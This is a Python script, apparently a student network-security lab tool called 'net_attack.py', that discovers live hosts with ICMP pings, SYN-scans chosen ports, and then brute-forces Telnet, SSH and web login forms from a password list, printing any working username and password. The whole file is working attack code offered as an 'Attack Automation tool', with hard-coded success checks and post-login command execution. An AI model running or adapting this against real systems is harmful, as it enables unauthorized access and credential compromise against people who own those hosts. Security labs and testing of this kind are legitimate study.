#!/usr/bin/python3
import sys
import os
from scapy.all import *
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
import time
import requests

# NOTE: The script will take some time to finish executing as it is slow due to the SSH function.
# This is because I'm making a new SSH connection every 10 secs otherwise I receive an SSHException error.
# Adding a time.sleep(10) was the way I handled that issue.
# NOTE -> username ubuntu will provide you with the result for the bruteforce telnet + ssh attack
# NOTE -> username admin will provide you with the result for the bruteforce web attack

conf.verb = 0 # gets rid of scapy's additional output after sending packets

""" The read_ip_list function is responsible for taking all the ip addressess from the ip_addresses.txt file
and splits each ip addressess by a newline character and stores them in a new list. Each item in this list will
be an ip address which will be returned and stored in a variable in the main function."""
def read_ip_list(ip_file):

	listOfIPs = []
	
	open_ip_file = open(ip_file, "r")
	read_ip_file = open_ip_file.read()
	
	listOfIPs.append(read_ip_file)
	
	for ip in listOfIPs:
		ip_list = ip.split("\n")
		
	new_ip_list = [ip for ip in ip_list if ip !=""]

	open_ip_file.close()
	
	return new_ip_list 




""" The is_reachable functions sends an ICMP ECHO REQUEST packet to all the ip addresses stored in the ip_list
in the main function and checks if each IP returns an ICMP ECHO REPLY. If there is an echo reply then this function will
return True else False. In the main function all IP's that has returned True will be stored in a new list called the newIpList
This enabled me to view all the active hosts on mininet. """	
def is_reachable(ip):


	reply = False
	packet = sr1(IP(dst=ip)/ICMP()/"hello", timeout=5)
	if packet is not None:
		
		res = packet[0][ICMP].code
		if res == 0:
			reply = True
			
		else:
			reply = False
	
	
	return reply




""" The scan_port function sends a TCP packet with a SYN flag and if a SYN / SYN ACK is returned that means the port is open
otherwise if a RST / RST ACK is returned then the port will be closed. Therefore, if a SYN / SYN ACK is returned then this function
will return True else False. All ports inputted by the user will be stored in the portList which can be found in the main function. 
In the main function the user will be notified if a port has been opened / closed """
def scan_port(ip,port):
	
	port_open = False

	pkt = sr1(IP(dst=ip)/TCP(dport=int(port), flags="S"))
	if(len(pkt) > 0):
		port_status = pkt[0][TCP].flags
		if "S" in port_status:
			port_open = True
		elif "R" in port_status:
			port_open = False
	
	return port_open



	
# /n is used to tell telnet to stop reading the username & password	
""" The bruteforce_telnet function will attempt to create a telnet connection to all the active hosts on the network
over port 23. It accomplishes this by using the username provided by the user and each passwords in the new_pass_list.
Once the username & password has been entered it checks if the "Welcome to" string is present and if it is this means
the telnet connection is successful. Therefore, commands such as ifconfig and exit will be executed. The working username +
password that was used to establish a telnet connection will be returned and shown to the user on the terminal."""
def bruteforce_telnet(ip,port,username,password_list_filename):
	
	# storing the final result in working_creds which will be the username + password that was able to authenticate
	working_creds = ''
	
	# open file, read passwords from the file, split each password using a newline char and after gettng rid of
	# any empty strings from the list store each password in the new_pass_list
	listOfPasswords = []
	
	open_pass_file = open(password_list_filename, "r")
	read_pass_file = open_pass_file.read()
	
	listOfPasswords.append(read_pass_file)
	
	for password in listOfPasswords:
		passList = password.split("\n")
		
	# getting rid of any empty strings in the list as there were 1 empty string	
	new_pass_list = [password for password in passList if password !=""]

	open_pass_file.close()
	
	# the encStr function encodes the string in ascii.
	def encStr(s):
		return s.encode('ascii')
	
	for pword in new_pass_list:
		
		conn = Telnet(ip, port) # make the telnet connection by specifiying the ip & port
		conn.read_until(encStr("login:")) # read until login:
		conn.write(encStr(username + "\n")) # after the script has read until login: it will insert the username
		conn.read_until(encStr("Password:")) # read until the Password:
		conn.write(encStr(pword + "\n")) # after the script has read until the Password: it will insert the password
		
		auth = conn.read_until(encStr("Welcome to"), timeout=1) # read until "Welcome to" and wait for 1 sec
		auth = auth.decode("ascii") # decode the encoded data
		
		if "Welcome to" in auth:
			conn.write(encStr("ifconfig\n"))
			conn.write(encStr("exit\n"))
			#decodeOutputToStr = conn.read_all().decode("ascii")
			#print("Auth Success")
			#print(decodeOutputToStr)
		
			working_creds = username + ":" + pword
			break
			
		else:
			working_creds = ""
			
			
			
	return working_creds



			
""" The bruteforce_ssh function will attempt to create an SSH connection every 10 seconds to all the active hosts on the network
over port 22. It accomplishes this by using the username provided by the user and each passwords in the new_pass_list.
Once the username & password has been entered and if the connection is successful then the ifconfig command will be executed. The authenticated
username & password will be shown to the user on the terminal."""
def bruteforce_ssh(ip,port,username,password_list_filename):	
	# Storing the final result in ssh_creds which will be the username + password that was able to authenticate
	ssh_creds = ''
	
	# open file, read passwords from the file, split each password using a newline char and after gettng rid of
	# any empty strings from the list store each password in the new_pass_list
	listOfPasswords = []
	open_pass_file = open(password_list_filename, "r")
	read_pass_file = open_pass_file.read()
	
	listOfPasswords.append(read_pass_file)
	
	for password in listOfPasswords:
		passList = password.split("\n")
		
	# getting rid of any empty strings in the list 
	new_pass_list = [password for password in passList if password !=""]

	open_pass_file.close()
	
	for pword in new_pass_list:
		try:
			ssh_client = SSHClient() # make an SSH connecton
			# This will say 'yes' to the authenticity of the host message when you initially create an SSH session with a host.
			ssh_client.set_missing_host_key_policy(AutoAddPolicy()) 
			time.sleep(10) # wait for 10 secs and connect otherwise there was a error reading ssh protocol banner SSHException.
			ssh_client.connect(ip, username=username, password=pword) # credentials used to make the SSH connection
			standardInput, standardOutput, standardError = ssh_client.exec_command("ifconfig")
			
			#print(standardOutput.read().decode('ascii')) # testing to see the standard output
			
			
			ssh_client.close() # if you have the above sleep function after closing the connection it still throws an ssh protocol banner SSHException.
			ssh_creds = username + ":" + pword
			break
			
			""" The AuthenticationException is in paramiko's library and it will trigger 
			if the auth failed -> https://docs.paramiko.org/en/stable/api/ssh_exception.html """
		except AuthenticationException as e:
			if str(e) == "Authentication failed.":
				ssh_creds = ""
	
	return ssh_creds




""" The bruteforce_web function attempt to bruteforce a web application by using login credentials. This will use the username + password
combo stored in the data dictionary to accomplish the attack. It will send a GET request to the site and if the returned status code is 200 a POST
request will be sent to the site with the username and password to bruteforce and gain access to the site. if the response from the post request
has -> Welcome admin! then the username and password will be returned to the user. """	
def bruteforce_web(ip,port,username,password_list_filename):
	data = {}
	weblogin_creds = ''
	
	listOfPasswords = []
	open_pass_file = open(password_list_filename, "r")
	read_pass_file = open_pass_file.read()
	
	listOfPasswords.append(read_pass_file)
	
	for password in listOfPasswords:
		passList = password.split("\n")
		
	# getting rid of any empty strings in the list 	
	new_pass_list = [password for password in passList if password !=""]

	open_pass_file.close()
	
	resp = requests.get("http://" + ip + ":" + port + "/index.php")
	webpage_detected = resp.status_code
	
	for pword in new_pass_list:
	
		if webpage_detected == 200:
			data["username"] = username
			data["password"] = pword
			response = requests.post("http://" + ip + ":" + port + "/login.php", data)	
			output = response.text
			if "Welcome admin!" in output:
				weblogin_creds = username + ":" + pword
			
	return weblogin_creds
	
	
	
	
""" The help function is used to provide the user with instructions on how to use this tool. This will be called if for example,
the user forgets to input an argument that's required to run this tool."""		
def help():
	print("Welcome to the Attack Automation tool.\
	\nThis script will help you to identify weak usernames and passwords used on different services of a running host.\
	\nThis will be carried out be executing Bruteforce Telnet, SSH & Web Attacks.")
	
	print("\nBelow are the options you can use when running this script:\
	\n1. -t -> is used to specify a filname that contains as list of IPs\
	\n2. -p -> is used to specify the port / ports that will be used to scan on the your target hosts\
	\n3. -u -> is used to specify the username\
	\n4. -f -> is used to specify a filename that contains a list of passwords.")
	
	print("\nFor example -> sudo ./net_attack.py -t ip_addresses -p 22,23,80,8080 -u ubuntu -f passwords.txt")
	print("\nPlease change the username to admin if you want to see the credentials from the bruteforce web attack")
	
	
	
		
""" The error function will print out an error message along with the help functions helpful instructions when a user
doesn't have the arguments requried to run this tool"""	
def error():

	if len(sys.argv) <= 1:
		print("Error: You have not provided the script with any arguments\n")
		help()
		exit()

	if len(sys.argv) <=2:
		print("Error: You have not provided the script with a file containing a list of IP addresses\n")
		help()
		exit()
	
	elif len(sys.argv) <=4:
		print("Error: You have not provided the script with a port\n")
		help()
		exit()
	
	elif len(sys.argv) <=6:
		print("Error: You have not provided the script with a username\n")
		help()
		exit()
		
	elif len(sys.argv) <=8:
		print("Error: You have not provided the script with a password file.\n")
		help()
		exit()



			
""" The main function contains all the arguments required to execute this script and the messages that a user will see on the terminal
when for example, the username + password used to authenicate the user after the script has carried out the Bruteforce Telnet, SSH & Web Attack. """
def main():
	ip_dict = {}
	
	
	ip_file = sys.argv[1]
	if ip_file in ("-t"):
		ip_file = sys.argv[2]
		
		ip_list = read_ip_list(ip_file)
		
		for ip in ip_list:
			reply = is_reachable(ip) # true or false response from function
			
			
			if ip not in ip_dict:
				ip_dict[ip] = reply
				if reply == False:
					ip_dict.pop(ip)
				else:
					pass
		
		
		newIpList = list(ip_dict.keys())
		
		print("\nACTIVE HOSTS ON YOUR NETWORK")
		for active_host in newIpList:
			print(active_host)
					
		
	
	ports = sys.argv[3]
	if ports in ("-p"):
		ports = sys.argv[4]
		
	
	username = sys.argv[5]
	if username in ("-u"):
		username = sys.argv[6]
		
	password_file = sys.argv[7]
	if password_file in ("-f"):
		password_file = sys.argv[8]
		
		portList = ports.split(",")
		
		for ip in newIpList:
		
			for port in portList:
		
				port_open = scan_port(ip,port)
						
				if port_open == True and port == '22':
					ssh_creds = bruteforce_ssh(ip,port,username,password_file)
					if (len(ssh_creds) > 0):
						print("\nBRUTEFORCE SSH RESULT")
						print("-----------------------------------------------------------------------------")
						print("username & password -> " + ssh_creds + " works on port " + port + " and host " + ip)
						print("-----------------------------------------------------------------------------\n")
					
					
				
				elif port_open == True and port == '23':
					working_creds = bruteforce_telnet(ip,port,username,password_file)
					if (len(working_creds) > 0):
						print("BRUTEFORCE TELNET RESULT")
						print("-----------------------------------------------------------------------------")
						print("username & password -> " + working_creds + " works on port " + port + " and host " + ip)
						print("-----------------------------------------------------------------------------\n")
				
				elif port_open == True and port == '80':
					weblogin_creds = bruteforce_web(ip,port,username,password_file)
					print("\nBRUTEFORCE WEB RESULT")
					print("-----------------------------------------------------------------------------")
					print("username & password -> " + weblogin_creds + " works on port " + port + " and host " + ip)
					print("-----------------------------------------------------------------------------\n")
				
				elif port_open == True and port == '8080':
					weblogin_creds = bruteforce_web(ip,port,username,password_file)
					print("BRUTEFORCE WEB RESULT")
					print("-----------------------------------------------------------------------------")
					print("username & password -> " + weblogin_creds + " works on port " + port + " and host " + ip)
					print("-----------------------------------------------------------------------------\n")
				
				elif port_open == True and port == '8888':
					weblogin_creds = bruteforce_web(ip,port,username,password_file)
					print("BRUTEFORCE WEB RESULT")
					print("-----------------------------------------------------------------------------")
					print("username & password -> " + weblogin_creds + " works on port " + port + " and host " + ip)
					print("-----------------------------------------------------------------------------\n")
					
				
				elif port_open == True:
					print("Port: " + port + " is open on host -> " + ip + "\n")
					
				
				else:
					print("Port: " + port + " is closed on host -> " + ip + "\n")
		

error()	
main()
